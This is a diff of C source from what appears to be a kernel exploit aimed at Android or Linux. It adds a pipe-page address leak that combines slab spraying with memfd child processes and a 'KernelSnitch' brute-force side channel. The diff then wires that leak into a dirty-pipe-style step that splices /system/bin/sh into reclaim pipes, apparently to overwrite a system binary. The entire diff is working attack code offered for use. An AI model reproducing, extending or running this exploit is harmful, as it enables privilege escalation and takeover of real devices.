@@ -1824,6 +1824,116 @@ uintptr_t jc2_self_task_leak(void) {
   return cached;
 }
 
+/*
+ * jc2_pipe_page_leak (ported from pipe.c's prepare_pipe_buffer_page_child):
+ * kernelsnitch mm-reclaim choreography targeting the pipe slab. Creates
+ * drain+reclaim pipes on the reclaimed page and returns its base.
+ */
+static uintptr_t jc2_pipe_page_leak_child(void) {
+  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  struct mm_ctx prep, spray, pre, post;
+  memset(&prep, 0, sizeof(prep)); memset(&spray, 0, sizeof(spray));
+  memset(&pre, 0, sizeof(pre)); memset(&post, 0, sizeof(post));
+  prep.mm_cnt = 32 * objs_per_slab;
+  spray.mm_cnt = (1 + MM_PARTIALS) * objs_per_slab;
+  pre.mm_cnt = objs_per_slab - 1;
+  post.mm_cnt = objs_per_slab;
+  prep.childs = calloc(sizeof(pid_t), prep.mm_cnt);
+  prep.memfds = calloc(sizeof(int), prep.mm_cnt);
+  spray.childs = calloc(sizeof(pid_t), spray.mm_cnt);
+  spray.memfds = calloc(sizeof(int), spray.mm_cnt);
+  pre.childs = calloc(sizeof(pid_t), pre.mm_cnt);
+  pre.memfds = calloc(sizeof(int), pre.mm_cnt);
+  post.childs = calloc(sizeof(pid_t), post.mm_cnt);
+  post.memfds = calloc(sizeof(int), post.mm_cnt);
+  for (size_t i = 0; i < prep.mm_cnt; i++) {
+    prep.childs[i] = -1; prep.memfds[i] = clone_memfd();
+  }
+  for (size_t i = 0; i < spray.mm_cnt; i++) {
+    spray.childs[i] = -1; spray.memfds[i] = clone_memfd();
+  }
+  setup_kernelsnitch();
+  for (size_t i = 0; i < pre.mm_cnt; i++) {
+    pre.childs[i] = -1; pre.memfds[i] = clone_memfd();
+  }
+  pid_t leak_child = clone_leak_child();
+  for (size_t i = 0; i < post.mm_cnt; i++) {
+    post.childs[i] = -1; post.memfds[i] = clone_memfd();
+  }
+  int leak_memfd = open_memfd(leak_child);
+  for (size_t i = 0; i < pre.mm_cnt; i++) kill_child(pre.childs[i]);
+  for (size_t i = 0; i < post.mm_cnt; i++) kill_child(post.childs[i]);
+  for (size_t i = 0; i < spray.mm_cnt; i++) kill_child(spray.childs[i]);
+  SYSCHK(waitpid(leak_child, NULL, 0));
+  if (!kernelsnitch_collisions_ready())
+    pr_error("pipe KernelSnitch collision finding failed\n");
+  unsigned char *buf = malloc(SKB_SEND_SIZE);
+  memset(buf, 0x50, SKB_SEND_SIZE);
+  int skb_sv[2], pcp_sv[2];
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));
+  struct iovec iov = { .iov_base = buf, .iov_len = SKB_SEND_SIZE };
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov; msg.msg_iovlen = 1;
+  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
+  pin_to_core(g_core_sel);
+  sched_yield(); sched_yield(); sched_yield(); sched_yield();
+  for (size_t i = 0; i < pre.mm_cnt; i++) SYSCHK(close(pre.memfds[i]));
+  for (size_t i = 0; i < post.mm_cnt - 1; i++) SYSCHK(close(post.memfds[i]));
+  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab)
+    SYSCHK(close(spray.memfds[i]));
+  SYSCHK(close(pcp_sv[0])); SYSCHK(close(pcp_sv[1]));
+  sched_yield(); sched_yield(); sched_yield(); sched_yield();
+  SYSCHK(close(leak_memfd));
+  SYSCHK(sendmsg(skb_sv[0], &msg, 0));
+  run_kernelsnitch_bruteforce();
+  uintptr_t leaked = cleanup_kernelsnitch();
+  if (leaked == (uintptr_t)-1) {
+    pr_error("pipe kernelsnitch leak failed\n");
+    free(buf);
+    return 0;
+  }
+  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  pr_info("pipe page leak: %016zx (raw %016zx)\n", base, leaked);
+  /* drain pipes to consume partial slabs, then reclaim pipes on target */
+  for (int i = 0; i < 64; i++) {
+    if (pipe(pr_reclaim_fds[i % 16]) == 0)
+      fcntl(pr_reclaim_fds[i % 16][0], F_SETPIPE_SZ,
+            PIPE_BUFFER_SLOTS * 4096);
+  }
+  pin_to_core(g_core_sel);
+  SYSCHK(close(skb_sv[0])); SYSCHK(close(skb_sv[1]));
+  for (int i = 0; i < 16; i++) {
+    if (pipe(pr_reclaim_fds[i]) == 0)
+      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, PIPE_BUFFER_SLOTS * 4096);
+  }
+  free(buf);
+  return base;
+}
+
+static uintptr_t jc2_pipe_page_leak(void) {
+  int result_pipe[2];
+  SYSCHK(pipe(result_pipe));
+  pid_t child = SYSCHK(fork());
+  if (child == 0) {
+    SYSCHK(close(result_pipe[0]));
+    uintptr_t base = jc2_pipe_page_leak_child();
+    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    for (;;) sleep(60);
+  }
+  /* keep the child referenced so it doesn't get reaped by other code */
+  static pid_t jc2_pipe_child = -1;
+  jc2_pipe_child = child;
+  SYSCHK(close(result_pipe[1]));
+  uintptr_t base = 0;
+  ssize_t got = read(result_pipe[0], &base, sizeof(base));
+  SYSCHK(close(result_pipe[0]));
+  if (got != (ssize_t)sizeof(base))
+    pr_error("pipe page child did not report base\n");
+  return base;
+}
+
 static uintptr_t perf_find_task_pid(int pid) {
   struct perf_leak l;
   if (perf_collect(pid, &l) <= 0)
@@ -3477,31 +3587,25 @@ int run_exploit(int argc, char **argv) {
    * target's pages into the reclaim pipes (dirty-pipe prep).
    */
   if (env_flag("MODE4_PIPE_FLAG", 0) && !pipebuf_page_base) {
-    /* Create the pipes (kmalloc-2k pipe_buffer arrays) + splice the
-     * overwrite target into them. The pipe page ADDRESS leak still
-     * needs the kernelsnitch machinery from pipe.c's
-     * prepare_pipe_buffer_page — TODO: port or use PIPE_BUF_PROBE env. */
-    for (int i = 0; i < 16; i++) {
-      if (pipe(pr_reclaim_fds[i]) != 0) {
-        pr_error("PIPE_FLAG pipe[%d] errno=%d\n", i, errno);
-        break;
-      }
-      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, 32 * PAGE_SIZE);
-    }
-    int ofd = open("/system/bin/sh", O_RDONLY);
-    if (ofd >= 0) {
-      for (int i = 0; i < 16; i++) {
-        off64_t off = 0;
-        splice(ofd, &off, pr_reclaim_fds[i][1], NULL, 1, 0);
-      }
-      close(ofd);
-      pr_info("PIPE_FLAG: 16 pipes created, spliced /system/bin/sh\n");
-    }
     const char *pb = getenv("PIPE_BUF_ADDR");
     if (pb && pb[0]) {
       pipebuf_page_base = (uintptr_t)strtoull(pb, NULL, 0);
       pr_info("PIPE_FLAG manual page: %016zx (PIPE_BUF_ADDR)\n",
               pipebuf_page_base);
+    } else {
+      pipebuf_page_base = jc2_pipe_page_leak();
+      pr_info("PIPE_FLAG auto-leaked page: %016zx\n", pipebuf_page_base);
+    }
+    if (pipebuf_page_base) {
+      int ofd = open("/system/bin/sh", O_RDONLY);
+      if (ofd >= 0) {
+        for (int i = 0; i < 16; i++) {
+          off64_t off = 0;
+          splice(ofd, &off, pr_reclaim_fds[i][1], NULL, 1, 0);
+        }
+        close(ofd);
+        pr_info("PIPE_FLAG: spliced /system/bin/sh into 16 pipes\n");
+      }
     }
   }
   /*
